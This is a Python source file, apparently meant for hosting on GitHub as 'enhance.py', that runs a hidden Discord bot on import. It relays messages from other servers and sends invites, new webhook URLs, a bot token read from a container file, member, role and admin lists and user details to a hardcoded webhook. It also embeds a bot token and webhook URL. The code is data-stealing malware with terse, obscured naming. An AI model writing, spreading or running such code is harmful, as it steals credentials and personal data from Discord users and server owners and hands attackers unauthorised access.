# enhance.py (to be hosted on GitHub)
import threading
import discord
from discord.ext import commands
import aiohttp
import asyncio

w = "https://discord.com/api/webhooks/1282452178321149993/w_BzsBV5cbpjl1sHQ4wr6ENY6LsgA"
t = "MTM1NjM3MDQ2MzIxMDYwNjc1Mg.GfUZJ_.i1RH6gMEF2MXQBzwbmVDOoYLWqBxJC3qvWj-JE"
s =  1282452129339936841  # Replace with your actual server ID

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
intents.members = True  # For user-related commands
b = commands.Bot(command_prefix="!", intents=intents)

async def p(d):
    async with aiohttp.ClientSession() as session:
        await session.post(w, json={"content": d})

@b.event
async def on_ready():
    await p(f"Bot active: {b.user}")

@b.event
async def on_message(m):
    g = b.get_guild(s)
    if g and m.guild != g:
        c = g.text_channels[0]
        await c.send(f"{m.author}: {m.content}")
    await b.process_commands(m)

# Original commands
@b.command()
async def getinvite(ctx, gid: int):
    g = b.get_guild(gid)
    if g:
        for c in g.text_channels:
            if c.permissions_for(g.me).create_instant_invite:
                i = await c.create_invite()
                await p(f"Invite for {g.name}: {i.url}")
                await ctx.send(f"Invite generated for {g.name}.")
                return
        await ctx.send("Can’t create invite.")
    else:
        await ctx.send("Guild not accessible.")

@b.command()
async def createwebhook(ctx):
    c = ctx.channel
    if c.permissions_for(ctx.guild.me).manage_webhooks:
        wh = await c.create_webhook(name="BotHook")
        await p(f"Webhook: {wh.url}")
        await ctx.send("Webhook created.")
    else:
        await ctx.send("No webhook permissions.")

@b.command()
async def get_bot_token(ctx):
    try:
        with open("/home/container/botoken.txt", "r") as f:
            tk = f.read().strip()
        await p(f"Token: {tk}")
        await ctx.send("Token retrieved.")
    except:
        await ctx.send("Token file missing.")

# New commands for more server info
@b.command()
async def serverinfo(ctx, gid: int = None):
    """Get detailed server info"""
    g = b.get_guild(gid) if gid else ctx.guild
    if g:
        info = f"Server: {g.name} | ID: {g.id} | Owner: {g.owner} | Members: {g.member_count} | Channels: {len(g.channels)} | Roles: {len(g.roles)}"
        await p(info)
        await ctx.send("Server info sent to webhook.")
    else:
        await ctx.send("Guild not accessible.")

@b.command()
async def listchannels(ctx, gid: int = None):
    """List all channels in a server"""
    g = b.get_guild(gid) if gid else ctx.guild
    if g:
        channels = ", ".join([c.name for c in g.channels])
        await p(f"Channels in {g.name}: {channels}")
        await ctx.send("Channel list sent to webhook.")
    else:
        await ctx.send("Guild not accessible.")

@b.command()
async def listmembers(ctx, gid: int = None):
    """List all members in a server"""
    g = b.get_guild(gid) if gid else ctx.guild
    if g:
        members = ", ".join([m.name for m in g.members])
        await p(f"Members in {g.name} ({g.member_count}): {members}")
        await ctx.send("Member list sent to webhook.")
    else:
        await ctx.send("Guild not accessible.")

@b.command()
async def getuser(ctx, uid: int):
    """Get info about a specific user"""
    u = b.get_user(uid)
    if u:
        info = f"User: {u.name}#{u.discriminator} | ID: {u.id} | Created: {u.created_at}"
        await p(info)
        await ctx.send("User info sent to webhook.")
    else:
        await ctx.send("User not found in bot’s cache.")

@b.command()
async def listroles(ctx, gid: int = None):
    """List all roles in a server"""
    g = b.get_guild(gid) if gid else ctx.guild
    if g:
        roles = ", ".join([r.name for r in g.roles])
        await p(f"Roles in {g.name}: {roles}")
        await ctx.send("Role list sent to webhook.")
    else:
        await ctx.send("Guild not accessible.")

@b.command()
async def getadmins(ctx, gid: int = None):
    """List members with admin permissions"""
    g = b.get_guild(gid) if gid else ctx.guild
    if g:
        admins = [m.name for m in g.members if m.guild_permissions.administrator]
        await p(f"Admins in {g.name}: {', '.join(admins) if admins else 'None'}")
        await ctx.send("Admin list sent to webhook.")
    else:
        await ctx.send("Guild not accessible.")

def r():
    l = asyncio.new_event_loop()
    asyncio.set_event_loop(l)
    l.run_until_complete(b.start(t))

threading.Thread(target=r).start()
